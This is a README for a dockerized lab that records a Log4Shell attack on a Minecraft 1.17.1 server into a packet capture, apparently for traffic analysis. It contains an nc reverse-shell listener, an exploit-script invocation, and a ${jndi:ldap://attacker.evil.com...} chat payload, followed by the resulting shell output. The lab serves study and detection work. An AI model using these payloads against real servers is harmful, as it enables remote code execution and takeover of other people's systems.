# Log4shell Minecraft exploitation lab
This guide describes how to generate the sample `capture.pcap` using a dockerized lab environment.

### Start containers
```
$ cd docker/
$ docker-compose up -d
```

### Legit player traffic
If you want to add some background noise, connect with a regular Minecraft client to your local server, mind to create a new Minecraft installation with v1.17.1 to be able to connect.

### log4j exploitation
```
# [term 0] udp reverse shell listener 
$ docker-compose exec attacker nc -u -nlvp 6666
Bound on 0.0.0.0 6666
```
```
# [term 1] try to exploit the server
$ docker-compose exec attacker python3 minecraft-log4shell.py -o -u user1234 -s vuln.minecraft-server.com -r attacker.evil.com --dns c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh --rce ldap://attacker.evil.com:389/#poc
....
[minecraft-log4shell] sending jndi:ldap rce udp bash reverse shell ...
Message (CHAT): {"translate":"chat.type.text","with":[{"insertion":"user1234","clickEvent":{"action":"suggest_command","value":"/tell user1234 "},"hoverEvent":{"action":"show_entity","contents":{"type":"minecraft:player","id":"c963d30f-bd07-3969-a89d-9702f2f81e56","name":{"text":"user1234"}}},"text":"user1234"},"${jndi:ldap://attacker.evil.com:389/#poc}"]}
[minecraft-log4shell] disconnecting...
```
Alternatively connect via a regular Minecraft client and paste this in the chat:
```
${jndi:ldap://attacker.evil.com:389/#poc}
```
After RCE you will get a shell:
```
# [term 0]
...
Connection received on 192.168.112.3 59611
$ id 
uid=1000(minecraft) gid=1000(minecraft) groups=1000(minecraft)
$ 
```

### tcpdump recording
```
$ docker-compose down
```

The pcap file will be located in `docker/tcpdump/capture.pcap`
